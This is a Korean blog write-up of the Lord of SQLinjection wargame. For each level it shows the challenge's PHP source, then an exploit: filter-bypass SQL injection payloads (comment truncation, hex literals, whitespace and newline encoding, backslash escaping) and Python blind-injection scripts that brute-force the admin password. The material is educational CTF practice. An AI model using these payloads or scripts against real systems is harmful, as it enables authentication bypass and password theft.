---
title: Lord of SQLinjection Writeup - 1
description: Lord of SQLinjection
date: 2024-11-10 00:02:00 +09:00
last_modified_at: 2024-11-10 00:02:00 +09:00
categories: [Hacking, Web]
# toc: false 오른쪽에 있는 목차 비활성화
# comments: false 댓글 비활성화
tags:
  [
    Hacking,
    Database,
  ]
---
## Gremlin
가장 기본적인 SQL-i 공격 기법이다.
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```
### exploit
아무 필터링도 하지 않는 취약한 코드를 사용한다.<br>
'or 1=1을 입력하여 쿼리를 참으로 만드는데 성공했다.
```sql
select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'
-> select id from prob_gremlin where id='' or 1=1-- -' and pw='{$_GET[pw]}
payload=' or 1=1-- -
```
<br>

## Cobolt
```php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```
### exploit
1번 문제와 다른 점은 pw를 md5를 사용해 암호화한다는 것과 조회된 id가 admin인지 확인한다는 것이다.
이 부분은 조회할 id를 admin으로 명시하고 pw 부분을 주석 처리하여 우회한다.
```sql
select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')
-> select id from prob_cobolt where id='admin'-- -' and pw=md5('{$_GET[pw]')
payload = admin'-- -
```
<br>

## Goblin
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```
### exploit
이번 문제는 **'**, **"**, **`** 을 필터링한다.<br>
no에 1을 입력하면 hello guest가 출력된이를 통해 guest의 no값이 1이라는 것을 알 수 있다.<br>
이를 이용하여 일부러 틀린 값을 입력하여 guest가 조회되지 않게 한다.<br> 
그 후 id값을 admin으로 변경하여 질의되도록 만들어야한다.<br>
하지만 **'** , **"** 가 필터링되어있기에 문자열을 입력할 수 없다.<br>
이를 우회하기 위해 admin의 16진수 값인 **0x61646d696e** 을 입력하면 문제를 해결할 수 있다.
```sql
select id from prob_goblin where id='guest' and no={$_GET[no]}
-> select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e-- -
payload = 0 or id=0x61646d696e-- -
```
<br>

## Orc
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```
<br>

별다른 필터링은 존재하지 않지만 __addslashes()__ 라는 처음보는 함수가 추가되었다.
![addslashes](/assets/img/post/addslashes.png)<br>
공식 문서에 따르면 **'** , **"** , **\\** , **Null**같은 글자를 이스케이프해서 반환한다고 한다.

**이스케이프(escape):** 특수문자나 제어문자를 일반 문자로써 사용할 수 있게 해준다.<br>
\ + 해당 문자를 해서 사용한ex) \\' , \\"

### exploit
id가 admin으로 고정되어 있admin의 pw만 알아낸다면 문제를 해결할 수 있다.<br>

admin의 pw를 알아내기 위해 **python**을 사용한 **브루트포스**를 이용할 것이다.

```python
import requests

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookie = {'PHPSESSID': 'Cookie 값'}

for i in range(20):
  param = {'pw': f"' or length(pw)={i}#"}
  res = requests.get(url, params=param, cookies=cookie)
  if 'Hello admin' in res.text:
    print(i)

length = 8
password = ''
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    query = {'pw': f"' or substr(pw, {str(len)}, 1)='{chr(pw)}'#"}
    res = requests.get(url, params=query, cookies=cookie)
    if 'Hello admin' in res.text:
      password = password + chr(pw)
      print(f'{len} : {chr(pw)}')
      break

print(password)
```
이 코드를 사용하면 pw를 알 수 있하지만 출력값을 그대로 입력하면 문제를 해결할 수 없다.<br>
mysql에서는 대소문자를 구분하지 않아서 소문자로 변환하여 입력해야 문제를 해결할 수 있다.
<br>
<br>

## Wolfman
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```
### exploit
공백이 필터링되어있어서 사용할 쿼리 값에 공백이 있으면 안된다.<br>
공백만 주의하면 쉽게 문제를 해결할 수 있다.

[공백을 우회하는 방법](https://binaryu.tistory.com/31)은 이 블로그를 참고하여 만들었다.

%0b를 사용하여 공백을 우회하였다.
```sql
select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'
-> select id from prob_wolfman where id='guest' and pw=''%0bor%0bid='admin'--%0b-'
payload = '%0bor%0bid='admin'--%0b-
```
<br>

## Darkelf
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
```
### exploit
**or**과 **and**를 필터링하기 때문에 기존에 사용하던 쿼리를 사용할 수 없다.<br>
하지만 or과 and를 ||과 &&로 대체하여 쉽게 우회할 수 있다.

```sql
select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'
-> select id from prob_darkelf where id='guest' and pw=''|| id='admin'-- -'
payload = ' || id='admin'-- -
```
<br>

## Orge
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```

### exploit
Orc 문제와 비슷하지만 **or**과 **and**를 필터링하는 점이 다르다.<br>
Orc 문제를 풀때 사용했던 파이썬 코드에 or, and 필터링 우회를 적용하면 문제를 해결할 수 있다.

```python
import requests

url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
cookie = {'PHPSESSID': 'Cookie 값'}

for i in range(20):
  param = {'pw': f"' || length(pw)={i}#"}
  res = requests.get(url, params=param, cookies=cookie)
  if 'Hello admin' in res.text:
    print(i)

length = 8
password = ''
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    query = {'pw': f"' || substr(pw, {str(len)}, 1)='{chr(pw)}'#"}
    res = requests.get(url, params=query, cookies=cookie)
    if 'Hello admin' in res.text:
      password = password + chr(pw)
      print(f'{len} : {chr(pw)}')
      break

print(password)
```
이 코드를 사용하면 pw를 알 수 있지만 Orc 문제와 똑같이 소문자로 변환하여 입력해야 문제를 해결할 수 있다.
<br><br>

## Troll
```php
<?php  
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match("/admin/", $_GET[id])) exit("HeHe");
  $query = "select id from prob_troll where id='{$_GET[id]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id'] == 'admin') solve("troll");
  highlight_file(__FILE__);
?>
```

### explot
이번에는 id에서 **'**와 **admin**을 필터링한다.<br>
하지만 id를 admin으로 만들어야 문제를 해결할 수 있다.

이 문제를 해결하기 위한 방법으로는 두번째 preg_match함수를 살펴보면 admin을 필터링하는데 뒤에 i가 붙어있지 않다.<br>
preg_match에서 i의 역할은 대문자로 입력된 admin도 구분없이 필터링한다는 의미다.<br>
mysql은 대소문자를 구별하지 않기 때문에 이를 이용하면 admin 필터링을 우회할 수 있다.

```sql
select id from prob_troll where id='{$_GET[id]}'
-> select id from prob_troll where id='ADMIN'
payload = ADMIN
```
<br>

## Vampire
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
  $_GET[id] = strtolower($_GET[id]);
  $_GET[id] = str_replace("admin","",$_GET[id]); 
  $query = "select id from prob_vampire where id='{$_GET[id]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("vampire"); 
  highlight_file(__FILE__); 
?>
```
<br>
str_replace라는 처음보는 함수가 사용되었는<br>
이 함수는 첫번째 매개변수로 사용된 문자를 세번째 매개변수에서 찾아서 두번째 매개변수로 변경한다.

![str_replace](/assets/img/post/str_replace.png)
### exploit
이번에도 **'**를 필터링하고 **str_replace**라는 함수가 사용되었다.
이 함수를 우회하는 방법으로는 str_replace함수를 지나서도 문자열이 유지되도록 하면된다.

```sql
select id from prob_vampire where id='{$_GET[id]}'
-> select id from prob_vampire where id='adadminmin'
payload = adadminmin
```
adadminmin을 입력하면 str_replace가 적용되어 admin이 지워져도 ad와 min이 합쳐져 admin이라는 문자열을 입력할 수 있다.
<br><br>

## Skeleton
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```
### exploit
별다른 필터링은 없지만 쿼리문 뒤에 and 1=0이 있어 어떤 입력값을 넣어도 거짓으로 만든다.
```sql
select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0
-> select id from prob_skeleton where id='guest' and pw=''or id='admin'-- -' and 1=0
payload = ' or id='admin'-- -
```
악의적인 입력값을 입력한 후에 -- -로 쿼리의 뒷부분을 주석처리하여 동작하지 않도록 만든다.
<br><br>

## Golem
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```
### exploit
**or** , **and** , **substr(** , **=** 을 필터링하고 있다.

필터링에 주의하며 앞선 Orc, Orge문제와 같이 파이썬 코드를 사용하면 된다.

or : || ,  and : && , substr() : mid() , = : like를 사용해서 우회 할 수 있다.
```python
import requests

url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
cookie = {'PHPSESSID': 'Cookie 값'}

for i in range(20):
  param = {'pw': f"' || length(pw) like {i}#"}
  res = requests.get(url, params=param, cookies=cookie)
  if 'Hello admin' in res.text:
    print(i)

length = 8
password = ''
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    query = {'pw': f"' || mid(pw, {str(len)}, 1) like '{chr(pw)}'#"}
    res = requests.get(url, params=query, cookies=cookie)
    if 'Hello admin' in res.text:
      password = password + chr(pw)
      print(f'{len} : {chr(pw)}')
      break

print(password.lower())
```
<br>

## Darknight
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```
### exploit
**'** , **substr** , **ascii** , **=** 을 필터링하고 있다.

필터링에 주의하며 앞선 Orc, Orge문제와 같이 파이썬 코드를 사용하면 된다.

' : ", substr() : mid() , = : like를 사용해서 우회 할 수 있다.
```python
import requests

url = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'
cookie = {'PHPSESSID': 'cookie 값'}

for i in range(20):
  param = {'no': f'"" || length(pw) like {i}#'}
  res = requests.get(url, params=param, cookies=cookie)
  if 'Hello admin' in res.text:
    print(i)

length = 8
password = ''
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    query = {'no': f'"" || mid(pw, {str(len)}, 1) like "{chr(pw)}"#'}
    res = requests.get(url, params=query, cookies=cookie)
    if 'Hello admin' in res.text:
      password = password + chr(pw)
      print(f'{len} : {chr(pw)}')
      break

print(password.lower())
```

## Bugbear
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```
### exploit
Darkknight 문제와 비슷하지만 필터링하는 것이 더 많다.
비슷한 방법으로 필터링을 우회하면 문제를 해결할 수 있다.

```python
import requests

url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php'
cookie = {"PHPSESSID" : 'cookie 값'}

for i in range(1, 100):
    param = {'no': f'0/**/||/**/id/**/in/**/("admin")/**/&&/**/length(pw)<{i}#'}
    res = requests.get(url, params=param, cookies=cookie)    
    if 'Hello admin' in res.text:
        length = i - 1
        print(f"pw\'s length is {length}")
        break

length = 8
password = ''
for len in range(1,length+1):
    for pw in range(ord('0'), ord('z')):
        param = {'no' : f'1/**/||/**/id/**/in/**/("admin")/**/&&/**/mid(pw,{str(len)},1)/**/in/**/("{chr(pw)}")#'}
        res = requests.get(url, params = param, cookies = cookie)
        if 'Hello admin' in res.text:
            print(f'{len} : {chr(pw)}')
            password = password + chr(pw)
            break

print(password.lower())
```
<br>

## Giant
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(strlen($_GET[shit])>1) exit("No Hack ~_~"); 
  if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe"); 
  $query = "select 1234 from{$_GET[shit]}prob_giant where 1"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result[1234]) solve("giant"); 
  highlight_file(__FILE__); 
?>
```
다양한 공백 우회 방법에 대한 필터링이 사용되고 있다.<br>
공백 필터링을 우회하여 from과 prob 사이의 공간을 만들어야 한다.

**%0b** 등 다른 공백 우회 방법을 사용해 문제를 해결할 수 있다.
```sql
select 1234 from{$_GET[shit]}prob_giant where 1
-> select 1234 from prob_giant where 1
```
<br>

## Assassin
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
```
### exploit
그냥 보면 **'** 만 필터링하는 평범한 구문이지만 like를 사용하고 있기 때문에 취약점이 있다.<br>
like는 _와 %를 사용해서 부분 일치를 검증할 수 있다.
```python
import requests

url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
cookie = {"PHPSESSID" : 'cookie 값'}

result_pw = ''

cash = ''
cash_1 = ''
for i in range(8):
    if not cash_1:
        result_pw += cash
        cash = ''
        cash_1 = ''
    for pw in range(ord('0'), ord('z')):
        param = {'pw': f'{result_pw+chr(pw)}%'}
        res = requests.get(url,params=param, cookies=cookie)
        if not "<hr><br><code>" in res.text:
            if "Hello admin" in res.text: # Hello admin | Hello guest를 바꿔가며 pw를 알아낼 수 있음
                if chr(pw) != '_':
                    cash = chr(pw)
            else:
                cash_1 = chr(pw)
                result_pw += chr(pw)
                break
    print(f'{i+1} : {result_pw}')

print(result_pw.lower())
```
<br>

## Succubus
```php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/\'/',$_GET[id])) exit("HeHe");
  if(preg_match('/\'/',$_GET[pw])) exit("HeHe");
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
```
### exploit
id와 pw를 입력받지만 모두 **'** 를 필터링하기 때문에 '로 강제로 문자열을 닫아서 우회할 수 없다.<br>
하지만 그 외에는 별다른 필터링이 없기 때문에 취약한 부분이 있다.<br>
id에 \를 입력하면 id='\'이 되기에 두 번째 '가 이스케이프되어 뒤에 and pw='부분까지 문자열로 인식된다.<br>
이 때 pw에 다른 쿼리 값을 입력하면 조작할 수 있다.
```sql
select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'
-> select id from prob_succubus where id='\' and pw='or 1=1#'
payload = id=\&pw=or 1=1#
```
<br>

## Zombie_Assasin
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();
  $_GET['id'] = strrev(addslashes($_GET['id']));
  $_GET['pw'] = strrev(addslashes($_GET['pw']));
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("zombie_assassin"); 
  highlight_file(__FILE__); 
?>
```
**strrev:** 문자열을 거꾸로 변환한다.
### exploit
addslashes 후에 strrev 함수가 적용되기 때문에 이를 이용하여 Succubus 문제를 풀듯이 하면된다.
```sql
select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'
-> select id from prob_zombie_assassin where id='"\' and pw='or 1=1-- -'
payload= id="&pw=- --1=1 ro
```
<br>

## Nightmare
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```
### exploit
크게 필터링하는 부분은 없지만 pw의 입력값이 6을 넘어가면 안된다.
이를 우회하기 위해 mysql의 Auto_type_cast를 사용한다.
```sql
select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'
-> select id from prob_nightmare where pw=('')=0;') and id!='admin'
payload = ')=0;%00
```
**Automatic_type_cast:** mysql에서 사용되는 자동 형변화 기능
ex) '123abc' = 123, 'abc123' != 123, 'abc'=0<br>
1. 문자열 앞에 오는 숫자는 자동으로 int 타입으로 변환하여 비교
2. 문자열 뒤에 오는 숫자는 자동변환 불가
3. 문자열 앞에 숫자가 없다면 0으로 취급

<br>


## Xavis
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```
### exploit
regex와 like를 제외하면 별다른 필터링이 없는 것을 알 수 있다.
```python
import requests

url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?'
cookie = {"PHPSESSID" : 'cookie 값'}


for i in range(100):
    param = {'pw' : f"'||length((pw)={i}-- -"}
    res = requests.get(url, params=param, cookies=cookie)
    if 'Hello admin' in res.text:
        length = i
        print(i)
        break

length = 24
password = ''
for len in range(1,length+1):
    for pw in range(0, 16):
        query = {'pw' : f"' or substr(pw, {str(len)}, 1)='{chr(pw)}'-- -"}
        res = requests.get(url, params = query, cookies = cookie)
        if 'Hello admin' in res.text:
            password += format(pw,'x')
            print(f"{len} : {format(pw,'x')}")
            break
print(password)
```
하지만 이 코드를 그대로 사용하면 pw의 길이가 24인 것은 알 수 있지만 모든 값이 0으로 출력된다.<br>
이유가 찾을 수 없어 검색해봤더니 pw의 값이 한글로 저장되어있어서 라는것을 알 수 있었다.<br>
값을 정상적으로 출력할 수 있도록 코드를 수정했다.
```python
import requests

url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?'
cookie = {"PHPSESSID" : 'cookie 값'}


for i in range(100):
    param = {'pw' : f"'||length(hex(pw))={i}-- -"}
    res = requests.get(url, params=param, cookies=cookie)
    if 'Hello admin' in res.text:
        length = i
        print(i)
        break

length = 24
password = ''
for len in range(1,length+1):
    for pw in range(0, 16):
        query = {'pw' : f"' or substr(hex(pw), {str(len)}, 1)='{format(pw, 'x')}'-- -"}
        res = requests.get(url, params = query, cookies = cookie)
        if 'Hello admin' in res.text:
            password += format(pw,'x')
            print(f"{len} : {format(pw,'x')}")
            break
print(password)
```
이렇게 코드를 수정하면 pw 값에 맞는 hex값을 얻을 수 있다.
출력된 값을 한글로 변환해보면 문제를 해결할 수 있우왕굳~~!
<br>

## Dragon
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("dragon");
  highlight_file(__FILE__); 
?>
```
### exploit
id값 뒤에 #이 붙어있어 pw에 어떤값을 입력하더라도 적용되지 않는다.
이 문제를 해결하려면 # 다시말해 한줄 주석을 우회해야한다.
```sql
select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'
-> select id from prob_dragon where id='guest'# and pw='%0a and pw='1' or id='admin'%23'
payload = %0a and pw='1' or id='admin'%23
```
이 문제를 해결하는 방법은 #이 한줄 주석인 것을 이용해 %0a로 그 뒤에 있는 값을 다른 줄로 인식하도록 만드는 것이다.<br>
%0a = \n의 URL encoding값이다.
<br>